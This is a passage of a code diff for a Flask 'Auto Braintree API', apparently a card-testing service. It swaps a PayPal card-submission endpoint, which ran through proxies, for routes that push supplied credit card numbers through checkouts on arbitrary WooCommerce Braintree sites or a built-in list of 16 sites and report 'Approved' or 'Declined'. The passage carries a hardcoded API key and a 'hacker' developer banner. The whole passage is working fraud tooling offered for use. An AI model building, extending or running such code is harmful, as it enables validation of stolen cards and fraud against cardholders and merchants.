+                error_msg = cc_result.get('error') or cc_result.get('response', 'Unknown error')
+                return {'success': False, 'response': error_msg}
+                
+        except Exception as e:
+            return {'success': False, 'response': str(e)[:100]}
+
+# ============================================================
+# ASYNC WRAPPER
+# ============================================================
+
+async def test_card_on_site(domain, cc):
+    """Test card on specific site with auto-detection"""
+    domain = extract_domain(domain)
+    
+    # Validate card
+    is_valid, msg = validate_cc(cc)
+    if not is_valid:
+        return {"Status": "Declined", "Response": f"Invalid card: {msg}", "Site": domain}
     
     try:
-        response = session.post('https://www.paypal.com/graphql?fetch_credit_form_submit', cookies=session.cookies, headers=headers, json=json_data, timeout=20)
-        response_data = response.json()
-    except (ValueError, requests.exceptions.RequestException) as e:
-        logging.error(f"Final GraphQL request failed: {e}. Response: {response.text}")
-        return {'code': 'INTERNAL_ERROR', 'message': 'Failed to submit payment to PayPal.'}
+        async with SmartBraintreeChecker(domain) as checker:
+            result = await checker.complete_workflow(cc)
+            
+            if result.get('success'):
+                return {"Status": "Approved", "Response": result['response'], "Site": domain}
+            else:
+                return {"Status": "Declined", "Response": result['response'], "Site": domain}
+    except Exception as e:
+        return {"Status": "Declined", "Response": str(e)[:100], "Site": domain}
 
-    # --- 3. Parse PayPal Response ---
-    result = {'code': 'TRANSACTION_SUCCESSFUL', 'message': 'Payment processed successfully.'}
-    if 'errors' in response_data and response_data['errors']:
-        logging.error(f"PayPal GraphQL error: {json.dumps(response_data)}")
-        error_data = response_data['errors'][0]
-        result['code'] = error_data.get('data', [{}])[0].get('code', 'UNKNOWN_ERROR')
-        result['message'] = error_data.get('message', 'An unknown error occurred.')
+# ============================================================
+# FLASK ROUTES
+# ============================================================
+
+@app.route('/')
+def home():
+    """API Documentation"""
+    return """
+    <html>
+    <head><title>Auto Braintree API - Smart Auto-Detect</title></head>
+    <body style="font-family: Arial; padding: 40px; background: #1a1a2e; color: #eee;">
+        <div style="max-width: 800px; margin: 0 auto; background: #16213e; padding: 30px; border-radius: 10px;">
+            <h1 style="color: #f39c12;">🚀 Auto Braintree Gateway API</h1>
+            <p style="color: #2ecc71; font-weight: bold;">✨ SMART AUTO-DETECT - Works on ANY Braintree site!</p>
+            <p style="color: #bbb;">Automatically tries all URL patterns for each site</p>
+            
+            <h2 style="color: #3498db;">API Endpoints:</h2>
+            
+            <div style="background: #0f3460; padding: 15px; margin: 15px 0; border-radius: 5px;">
+                <strong style="color: #2ecc71;">Single Site Test:</strong>
+                <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
+                /gateway=AutoBraintree/key=md-tech1/site=DOMAIN/cc=CARD
+                </code>
+            </div>
+            
+            <div style="background: #0f3460; padding: 15px; margin: 15px 0; border-radius: 5px;">
+                <strong style="color: #2ecc71;">Multi-Site Test (16 sites):</strong>
+                <code style="display: block; background: #1a1a2e; padding: 10px; margin: 10px 0; border-radius: 3px; color: #f39c12;">
+                /gateway=AutoBraintree/key=md-tech1/cc=CARD
+                </code>
+            </div>
+            
+            <h2 style="color: #3498db;">Features:</h2>
+            <ul style="color: #bbb;">
+                <li>✅ Auto-detects URL patterns (/my-account/ or /customer-account/)</li>
+                <li>✅ Auto-detects payment method (braintree_credit_card or braintree_cc)</li>
+                <li>✅ Works on ANY WooCommerce Braintree site</li>
+                <li>✅ Fast parallel testing</li>
+            </ul>
+            
+            <h2 style="color: #3498db;">Response:</h2>
+            <code style="display: block; background: #1a1a2e; padding: 15px; border-radius: 5px; color: #2ecc71;">
+{<br>
+&nbsp;&nbsp;"Status": "Approved/Declined",<br>
+&nbsp;&nbsp;"Response": "Message",<br>
+&nbsp;&nbsp;"Site": "domain.com"<br>
+}
+            </code>
+            
+            <p style="text-align: center; color: #888; margin-top: 30px;">Smart Auto-Detect v2.0</p>
+        </div>
+    </body>
+    </html>
+    """
+
+@app.route('/gateway=AutoBraintree/key=<key>/site=<path:domain>/cc=<path:cc>')
+def gateway_single(key, domain, cc):
+    """Test card on single site with auto-detection"""
+    if key != API_KEY:
+        return jsonify({"Status": "Declined", "Response": "Invalid API key", "Site": "N/A"}), 401
     
-    return result
-
-
-@app.route('/gate=pp1/cc=<card_details>')
-def payment_gateway(card_details):
-    """
-    Main endpoint to process a payment.
-    URL Format: /gate=pp1/cc={card_number|mm|yy|cvv}?proxy={proxy_string}
-    Proxy string can be in formats:
-    - http://user:pass@ip:port
-    - user:pass@ip:port
-    - ip:port:user:pass
-    """
-    # 1. Get and validate the proxy parameter
-    proxy_string = request.args.get('proxy')
-    if not proxy_string:
-        logging.error("Request denied: Proxy parameter is missing.")
-        return jsonify({"error": "Proxy parameter is required. Format: ?proxy=http://user:pass@ip:port or ?proxy=user:pass@ip:port or ?proxy=ip:port:user:pass"}), 400
-
     try:
-        proxy_config = parse_proxy_string(proxy_string)
-    except ValueError as e:
-        logging.error(f"Request denied: {e}")
-        return jsonify({"error": str(e)}), 400
+        result = asyncio.run(test_card_on_site(domain, cc))
+        return jsonify(result)
+    except Exception as e:
+        return jsonify({"Status": "Declined", "Response": str(e)[:100], "Site": domain}), 500
 
-    if not check_proxy_connection(proxy_config):
-        logging.error("Request denied: Proxy connection test failed.")
-        # Note: The error "Failed to resolve 'chut.bhosda'" in your logs is due to an invalid proxy hostname.
-        # The code is working correctly by rejecting it. Please ensure your proxy details are accurate.
-        return jsonify({"error": "Proxy connection failed. Please check the proxy details and DNS resolution."}), 503
-
-    # 2. Process the payment if proxy is valid
-    last_four = card_details.split('|')[0][-4:] if '|' in card_details and len(card_details.split('|')[0]) >= 4 else '****'
-    logging.info(f"Received payment request for card ending in {last_four} via proxy.")
+@app.route('/gateway=AutoBraintree/key=<key>/cc=<path:cc>')
+def gateway_multi(key, cc):
+    """Test card on multiple default sites with auto-detection"""
+    if key != API_KEY:
+        return jsonify({"Status": "Declined", "Response": "Invalid API key", "Site": "N/A"}), 401
     
-    result = process_paypal_payment(card_details, proxy_config)
+    try:
+        results = []
+        for domain in DEFAULT_SITES:
+            try:
+                result = asyncio.run(test_card_on_site(domain, cc))
+                results.append(result)
+            except Exception as e:
+                results.append({"Status": "Declined", "Response": str(e)[:100], "Site": domain})
+        
+        return jsonify(results)
+    except Exception as e:
+        return jsonify([{"Status": "Declined", "Response": str(e)[:100], "Site": "All"}]), 500
+
+@app.errorhandler(404)
+def not_found(error):
+    return jsonify({"Status": "Declined", "Response": "Endpoint not found", "Site": "N/A"}), 404
+
+# ============================================================
+# RUN SERVER
+# ============================================================
+
+if __name__ == "__main__":
+    print("""
+╔════════════════════════════════════════════════════════════╗
+║   AUTO BRAINTREE API - SMART AUTO-DETECT VERSION          ║
+╚════════════════════════════════════════════════════════════╝
+
+🚀 Server: http://localhost:8000/
+🔑 API Key: md-tech1
+
+✨ SMART AUTO-DETECT FEATURES:
+──────────────────────────────
+✅ Automatically tries /my-account/ URLs
+✅ Automatically tries /customer-account/ URLs
+✅ Automatically tries /account/ URLs
+✅ Automatically detects payment method type
+✅ Works on ANY WooCommerce Braintree site!
+
+ENDPOINTS:
+──────────
+Single Site (ANY site):
+http://localhost:8000/gateway=AutoBraintree/key=md-tech1/site=ANYSITE.com/cc=CARD
+
+Multi Site:
+http://localhost:8000/gateway=AutoBraintree/key=md-tech1/cc=CARD
+
+OUTPUT:
+───────
+{
+  "Status": "Approved/Declined",
+  "Response": "Message",
+  "Site": "domain.com"
+}
+👨🏻‍💻 DEV -『⛥ 𝗠𝗗 𝗧𝗘𝗖𝗛 𝗛𝗔𝗖𝗞𝗘𝗥 ⛥』
+════════════════════════════════════════════════════════════
+    """)
     
-    code = result.get('code')
-    if code in APPROVED_CODES: status = 'approved'
-    elif code in DECLINED_CODES: status = 'declined'
-    else: status = 'charged'
-
-    final_response = {"status": status, "code": code, "message": result.get('message')}
-    logging.info(f"Transaction result: {final_response}")
-    return jsonify(final_response)
-
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=8000, debug=False, threaded=True)
